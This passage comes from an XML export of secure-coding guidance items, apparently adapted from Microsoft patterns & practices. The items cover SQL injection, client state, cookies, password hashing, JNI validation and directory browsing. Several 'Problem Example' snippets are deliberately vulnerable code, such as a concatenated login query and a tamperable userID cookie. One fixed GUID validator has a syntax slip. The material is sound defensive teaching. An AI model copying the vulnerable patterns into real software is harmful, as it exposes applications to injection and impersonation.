&lt;/p&gt;
&lt;p&gt;Just using stored procedures isn't a complete remedy for SQL injection. The important thing to do is use parameters with stored procedures, or else your stored procedures can be susceptible to SQL injection if they use unfiltered input. Stored procedures
 provide several security advantages: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;By parameterizing input parameters and type-enforcing them, user input is effectively filtered.
&lt;/li&gt;&lt;li&gt;Stored procedures are allowed by most databases&amp;nbsp;to execute under different security privileges than&amp;nbsp;from the database user, thereby restricting the ability of the application to do anything beyond the actions specified in the stored procedures. For instance,
 an application would have execute access to a stored procedure but no access to the base tables.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;To use type-safe SQL parameters, follow these steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;If possible, use stored procedures. &lt;/strong&gt;Stored procedures are pre-compiled statements that are stored on the database server. Using stored procedures improves your application's performance and security. Consult the
&lt;a href="?#ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662"&gt;Use Stored Procedures&lt;/a&gt; guideline for more details.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the SQL queries. &lt;/strong&gt;Locate all SQL queries throughout your application. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;Connection cn = MyApp.getDBConnection();&lt;br&gt;Statement st = cn.createStatement();&lt;br&gt;String query = &amp;quot;select login_attempts from myappUsers where user = \&amp;quot;&amp;quot; &amp;#43; user&lt;br&gt;             &amp;#43; &amp;quot;\&amp;quot; and pass = \&amp;quot;&amp;quot; &amp;#43; new String(passDigest) &amp;#43; &amp;quot;\&amp;quot;;&amp;quot;;&lt;br&gt;ResultSet rs = st.executeQuery(query);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the parameters in each SQL query. &lt;/strong&gt;After locating all SQL queries, identify the parameters in each query. Understand the format and type of each parameter's data.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use PreparedStatement. &lt;/strong&gt;Java supports parameterized queries via its
&lt;strong&gt;PreparedStatement&lt;/strong&gt; class. &lt;strong&gt;PreparedStatement&lt;/strong&gt; is mapped by most databases to a parameterized query or a stored procedure. Although the implementation may differ&amp;nbsp;among databases, the functionality is the same. Turn all SQL queries
 into parameterized queries. To accomplish this, turn all &lt;strong&gt;Statement&lt;/strong&gt; objects into
&lt;strong&gt;PreparedStatement&lt;/strong&gt; objects. For example, the SQL query from Step 1 would be:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;Connection cn = MyApp.getDBConnection();&lt;br&gt;PreparedStatement st = cn.prepareStatement(&amp;quot;select login_attempts from myappUsers&amp;quot;&lt;br&gt;                     &amp;#43; &amp;quot; where user = ? and pass = ?;&amp;quot;);&lt;br&gt;st.setString(1, user);&lt;br&gt;st.setString(2, new String(passDigest));&lt;br&gt;ResultSet rs = st.executeQuery();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;For more information, consult the documentation for &lt;a href="http://java.sun.com/j2se/1.4.2/docs/api/java/sql/PreparedStatement.html"&gt;
Class PreparedStatement&lt;/a&gt; in the Java SDK.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code validates the user based on a given username and password. It hashes the password with a random salt, then it compares the username and the produced hash against the data stored in the backend database. Unfortunately, the SQL query is
 dynamically crafted by using the user's input. If there is no proper input validation, an attacker can access the application's database server through the use of SQL injection.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;      // Hash the credentials before querying the credential store&lt;br&gt;      // The application crafts the SQL query based on user's input&lt;br&gt;      Connection cn = MyApp.getDBConnection();&lt;br&gt;      Statement st = cn.createStatement();&lt;br&gt;      String query = &amp;quot;select login_attempts from myappUsers where user = \&amp;quot;&amp;quot;&lt;br&gt;                    &amp;#43; user &amp;#43; &amp;quot;\&amp;quot; and pass = \&amp;quot;&amp;quot; &amp;#43; passHash &amp;#43; &amp;quot;\&amp;quot;;&amp;quot;;&lt;br&gt;      ResultSet rs = st.executeQuery(query);&lt;br&gt;       // Execute the rest of the authentication steps&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code validates the user based on given username and password. It hashes the password with a random salt, then it compares the username and the produced hash against the data stored in the backend database. Because the application uses
&lt;strong&gt;PreparedStatement&lt;/strong&gt;, it is much more difficult for an attacker to gain access to the application's database server through the use of SQL injection.
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;      // Hash the credentials before querying the credential store&lt;br&gt;      // The application uses parameterized queries&lt;br&gt;      Connection cn = MyApp.getDBConnection();&lt;br&gt;      PreparedStatement st = cn.prepareStatement(&amp;quot;select user from myappUsers&amp;quot;&lt;br&gt;                            &amp;#43; &amp;quot; where user = ? and pass = ?;&amp;quot;);&lt;br&gt;      st.setString(1, user);&lt;br&gt;      st.setString(2, passHash);&lt;br&gt;      ResultSet rs = st.executeQuery();&lt;br&gt;       // Execute the rest of the authentication steps&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about using parameterized queries in Java, see: Documentation for
&lt;a href="http://java.sun.com/j2se/1.4.2/docs/api/java/sql/PreparedStatement.html"&gt;
Interface PreparedStatement&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about preventing SQL injection attacks, visit: &lt;a href="http://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection"&gt;
Reviewing Code for SQL Injection&lt;/a&gt; from OWASP. &lt;/li&gt;&lt;li&gt;To learn more about SQL server security, visit: &lt;a href="http://www.sqlsecurity.com/"&gt;
SQLSecurity.com&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662"&gt;Guideline: Use Stored Procedures (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:81491E66-67B7-49F3-BDA6-4B4C9245C702"&gt;Guideline: Validate All Input Passed to Database (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D089D9CA-860C-4F98-BC7E-5AD7553DB6DD"&gt;Checklist Item: Client-Side Validation is Not Relied On (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:AA3B4801-99BA-43B0-90A6-D38A605E8574"&gt;Checklist Item: Type Safe SQL Parameters are Used (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6"&gt;Attack: Server-Side Code Injection Attack&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>0eb30137-081e-4451-8ed2-36ff674d37d8</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Do Not Rely on Client State Management Options</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Session Management</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Avoid using any of the client-side state management options, such as view state, cookies, query strings, or hidden form fields, to store sensitive data.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;All information that is store on the client side can be tampered with by the client. Storing sensitive information on the client can compromise the integrity and confidentiality of your application's data.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Uniformly applicable whenever a sensitive info is being stored somewhere to maintain state.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps when considering the use of client state management:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify sensitive information. &lt;/strong&gt;Sensitive data is any information that is kept secret and should be disclosed only to authorized parties. Common examples of sensitive data include, but are not limited to, names of customers, government issued
 ID numbers, credit card and other financial information, passwords, and private keys. Some industries, such as health care and banking, have regulatory standards that define sensitive information. Use regulatory requirements, as they apply to your application,
 to identify sensitive data. Sensitive data can be defined as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Information that either contains personally identifiable information or can be used to derive personally identifiable information that should not be shared with others.
&lt;/li&gt;&lt;li&gt;Information that a user provides that they would not want shared with other users of the application.
&lt;/li&gt;&lt;li&gt;Information that comes from an external trusted source that is not designed to be shared with users.&lt;/li&gt;&lt;/ul&gt;
&lt;strong&gt;&lt;/strong&gt;&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the use.&lt;/strong&gt; Identify the use of the sensitive data. Consult with your application's design, functional requirements, and security documentation to determine whether it is necessary to use client state management for handling certain
 sensitive data. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose appropriate management options.&lt;/strong&gt; Sensitive data should always be stored into server-side state management options such as a database. If your application's documentation requires client state management, ensure that strong encryption
 is applied.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Apply appropriate management options.&lt;/strong&gt; Identify all uses of sensitive data. Ensure that the appropriate management options are applied.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following snippet shows an application that keeps track of the current user via the use of cookies. Unfortunately, an attacker can change the userID value of the cookie and impersonate another user.&lt;/p&gt;
&lt;pre&gt;Response.Cookies[&amp;quot;userID&amp;quot;].Value = &amp;quot;joe&amp;quot;;&lt;/pre&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following snippet shows an application that keeps track of the current user via the use of server-side sessions. Therefore, it is impossible for an attacker to change the userID value and impersonate another user.&lt;/p&gt;
&lt;pre&gt;Session[&amp;quot;userID&amp;quot;] = &amp;quot;joe&amp;quot;;&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about parameter manipulation and ways to prevent it, see: &lt;a href="http://www.cgisecurity.com/owasp/html/ch11s04.html"&gt;
Parameter Manipulation&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;To learn more about session management, see: &lt;a href="http://www.securityfocus.com/infocus/1774"&gt;
Basic Web Session Impersonation&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1c35c0ac-2282-4f60-8879-3e1494350397</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Encrypt and Check Integrity of Authentication Cookies</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Encrypt all authentication cookies and check their integrity before trusting them.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unencrypted authentication cookies can be easily forged by attackers, allowing them to act as any user in the system.&amp;nbsp; Simply relying on the existence of an authentication cookie without checking its integrity and the correctness of the values it contains
 may allow an attacker to spoof an authentication cookie with garbage data, again being able to access the site when they should not.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Whenever authentication cookies are used, they should be encrypted and have their integrity checked each time they are used before trusting them.
&lt;/p&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>1e86ab18-716e-4761-b3f9-6ababeee2511</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Specify Hashed Password Format in Provider Configuration</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Specify a hashed password format in the configuration for you membership provider.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;By storing your password with hashes and salt, you help prevent an attacker that gains access to your user store from obtaining the user passwords.&amp;nbsp; If you use encryption, you have the added problem of securing the encryption key; hashes are not reversible
 and have no key to be compromised.&amp;nbsp; If your credential store is compromised, the salt value helps to slow an attacker who is attempting to perform a dictionary attack.&amp;nbsp; This gives you additional time to detect and react to the compromise.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All systems which use membership providers should use a hashed password format.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Do not store user passwords either in plaintext or encrypted format.&amp;nbsp; Instead, store password hashes with salt.&amp;nbsp; Use one of the membership providers to help protect credentials in storage and where possible, specify a hashed password format on your provider
 configuration.&lt;/p&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>21a9dbc2-dc93-46ea-b8a6-61e8398940c6</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Validate All Data Passed Between Native and Java Code</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Unmanaged Code</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Validate all data that is passed between Java code and native code.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Unchecked input and/or output can lead to buffer overflows, injection based attacks such as SQL injection and cross-site scripting, etc., that can&amp;nbsp;exploit weaknesses in the application.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Your application should always verify data that is passed between native code and Java.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;There are several things to consider when validating input/output between native and Java code:
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check language barriers. &lt;/strong&gt;Distinguishing&amp;nbsp;the boundaries between native and Java code is very important. Because the Java sandbox provides multiple security checks to its code, it is important to know the boundary&amp;nbsp;between&amp;nbsp;where the Java sandbox
 ends and the compiled code begins&amp;nbsp;to interact&amp;nbsp;directly with the CPU, so you can&amp;nbsp;compensate for&amp;nbsp;the lack of such checks inside the native code.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Validate for length, range, format and type. &lt;/strong&gt;After discovering the language boundaries, determine the type, format and structure of the data that is passed between Java and native code. Build a validator for each type of data that is passed
 between the two environments. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Construct a set of validators. &lt;/strong&gt;Centralize your application's validators as it helps strengthen the code by limiting the amount of scattered validation code throughout your application. Place the set of validators on the language barriers.
 Your application should pass data between native and Java code only through its set of validators.&lt;/p&gt;
&lt;p&gt;Consult with the &lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;
Validate Input for Length, Range, Format, and Type&lt;/a&gt; guideline for more details.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following segment shows a JNI code that utilizes a COM object. Making the assumption that the Java code will handle data validation, the JNI segment does not verify that the passed input is a valid GUID. Since invalid GUIDs may cause unhandled exceptions,
 an attacker can force the application to disclose its call stack and possibly its source filenames.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;#include &amp;lt;jni.h&amp;gt;&lt;br&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;br&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;br&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;#include &amp;lt;atlbase.h&amp;gt;&lt;br&gt;#include &amp;lt;windows.h&amp;gt;&lt;br&gt;#include &amp;lt;wtypes.h&amp;gt;&lt;br&gt;JNIEXPORT jboolean&lt;br&gt;JNICALL Java_Identifier_invokeObject&lt;br&gt;      (JNIEnv * env, jobject jobj, jstring jguid)&lt;br&gt;{&lt;br&gt;      HRESULT result;&lt;br&gt;      CLSID clsid;&lt;br&gt;      IUnknown *pIunkn;&lt;br&gt;      LPWSTR guid;&lt;br&gt;      jboolean iscopy;&lt;br&gt;      jboolean ret = false;&lt;br&gt;      char* temp_guid = (*env)-&amp;gt;GetStringUTFChars(env, jguid, &amp;amp;iscopy);&lt;br&gt;      //The application fails to verify that the GUID is valid&lt;br&gt;      guid = SysAllocStringLen(0, 38);&lt;br&gt;      MultiByteToWideChar(CP_ACP, 0, temp_guid, -1, guid, 38);&lt;br&gt;      result = GUIDFromString(guid, &amp;amp;clsid);&lt;br&gt;       ...&lt;br&gt;       return ret;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following segment shows a JNI code that utilizes a COM object. Because the passed input is validated as being a GUID, the application reduces the risk of unhandled exceptions.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;#include &amp;lt;jni.h&amp;gt;&lt;br&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;br&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;br&gt;#include &amp;lt;stdio.h&amp;gt;&lt;br&gt;#include &amp;lt;atlbase.h&amp;gt;&lt;br&gt;#include &amp;lt;windows.h&amp;gt;&lt;br&gt;#include &amp;lt;wtypes.h&amp;gt;  &lt;br&gt;JNIEXPORT jboolean &lt;br&gt;JNICALL Java_Identifier_invokeObject&lt;br&gt;      (JNIEnv * env, jobject jobj, jstring jguid)&lt;br&gt;{&lt;br&gt;      HRESULT result;&lt;br&gt;      CLSID clsid;&lt;br&gt;      IUnknown *pIunkn;&lt;br&gt;      LPWSTR guid;&lt;br&gt;      jboolean iscopy;&lt;br&gt;      jboolean ret = false;&lt;br&gt;      char* temp_guid = (*env)-&amp;gt;GetStringUTFChars(env, jguid, &amp;amp;iscopy);&lt;br&gt;      // The application verifies that the input matches the criteria for a GUID&lt;br&gt;      if(!validGUID(temp_guid))&lt;br&gt;      {&lt;br&gt;            return ret;&lt;br&gt;      }&lt;br&gt;      guid = SysAllocStringLen(0, 38);&lt;br&gt;      MultiByteToWideChar(CP_ACP, 0, temp_guid, -1, guid, 38);&lt;br&gt;      result = GUIDFromString(guid, &amp;amp;clsid);&lt;br&gt;       ...&lt;br&gt;      return ret;&lt;br&gt;}&lt;br&gt; bool validGUID(char *guid)&lt;br&gt;{&lt;br&gt;      // Check that GUID is of right length&lt;br&gt;      if(strlen(guid) != 38) return false;&lt;br&gt;      // Sample GUID: {1EF4A023-143A-4e0e-AD72-69C2C68C2D70&lt;br&gt;}&lt;br&gt;      if(guid[0]  != '{') return false;&lt;br&gt;      if(guid[9]  != '-') return false;&lt;br&gt;      if(guid[14] != '-') return false;&lt;br&gt;      if(guid[19] != '-') return false;&lt;br&gt;      if(guid[24] != '-') return false;&lt;br&gt;      if(guid[37] != '}') return false;&lt;br&gt;      int i=1;&lt;br&gt;      while(i&amp;lt;37)&lt;br&gt;      {&lt;br&gt;            if((guid[i] &amp;gt;= 'a' &amp;amp;&amp;amp; guid[i] &amp;lt;= 'f')&lt;br&gt;                  || (guid[i] &amp;gt;= 'A' &amp;amp;&amp;amp; guid[i] &amp;lt;= 'F')&lt;br&gt;                  || (guid[i] &amp;gt;= '0' &amp;amp;&amp;amp; guid[i] &amp;lt;= '9')&lt;br&gt;            {&lt;br&gt;                  // GUID is valid&lt;br&gt;            }&lt;br&gt;            else&lt;br&gt;            {&lt;br&gt;                  return false;&lt;br&gt;            }&lt;br&gt;            i&amp;#43;&amp;#43;;&lt;br&gt;            if(i == 9 || i == 14 || i == 19 || i == 24)&lt;br&gt;            {&lt;br&gt;                  i&amp;#43;&amp;#43;;&lt;br&gt;            }&lt;br&gt;      }&lt;br&gt;       return true;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about JNI, see: &lt;a href="http://java.sun.com/j2se/1.3/docs/guide/jni/spec/jniTOC.doc.html"&gt;
Java Native Interface Specification&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about the security issues that JNI introduces, see: &lt;a href="http://www.owasp.org/index.php/Unsafe_JNI"&gt;
Unsafe JNI&lt;/a&gt; from OWASP. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559"&gt;Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:935E30F8-67B9-4E5B-B6F6-18644DD62B3E"&gt;Guideline: Minimize the Number of Times Language Boundaries are Crossed (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:37CE275C-4A57-42D1-904B-2262A7DA1AA2"&gt;Attack: Format String Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B86F003F-DB0C-41D4-B31A-F9AE1BF7C9C1"&gt;Attack: Deserialization of Untrusted Data Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017"&gt;Attack: XML Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:C7AC7D00-4AEA-4AFA-AD2D-1E812664BA38"&gt;Attack: Canonicalization Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0"&gt;Attack: LDAP Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D"&gt;Attack: Command Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:41BACAD4-8875-4F83-A9F6-C2263B23ABC4"&gt;Attack: File Name and Path Manipulation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0"&gt;Attack: Xpath-XQuery Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36"&gt;Attack: AJAX Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D47CF578-0D27-4F11-B594-C508E50982B5"&gt;Checklist Item: All Data Passed Between Native and Java Code is Validated (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>22701ae6-1207-4e89-b62c-537bd112fb84</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Disable Directory Browsing</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Deployment Considerations</category>
    <phase>Deployment</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;p&gt;Applications written using Servlets or JSP.&lt;/p&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Disable directory browsing for your application's web directories.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Directory browsing allows an attacker to browse your application's directory structure in search of unprotected files and components.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Disable directory browsing at all times.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps to successfully disable directory browsing:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify if directory browsing is enabled. &lt;/strong&gt;Navigate to your application's directories. Identify&amp;nbsp;whether your application's server correctly returns an HTTP error message. If it incorrectly returns&amp;nbsp;the directory contents, continue with the
 following steps.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Locate the default servlet's configuration. &lt;/strong&gt;Open your application's deployment descriptor (e.g. web.xml), and locate the default servlet's configuration. If the default servlet is present, it is mapped to the root directory of your application.
 Example: &lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;servlet&amp;gt;&lt;br&gt;      &amp;lt;servlet-name&amp;gt;default_servlet&amp;lt;/servlet-name&amp;gt;&lt;br&gt;      &amp;lt;servlet-class&amp;gt;&lt;br&gt;            org.apache.catalina.servlets.DefaultServlet&lt;br&gt;      &amp;lt;/servlet-class&amp;gt;&lt;br&gt;&amp;lt;/servlet&amp;gt;&lt;br&gt;&amp;lt;servlet-mapping&amp;gt;&lt;br&gt;      &amp;lt;servlet-name&amp;gt;default_servlet&amp;lt;/servlet-name&amp;gt;&lt;br&gt;      &amp;lt;url-pattern&amp;gt;/&amp;lt;/url-pattern&amp;gt;&lt;br&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Deny directory browsing in the default servlet's configuration. &lt;/strong&gt;
Initialize the default servlet with the parameter &lt;strong&gt;listings&lt;/strong&gt; set to
&lt;strong&gt;false&lt;/strong&gt;. Example:&lt;/p&gt;
&lt;blockquote&gt;
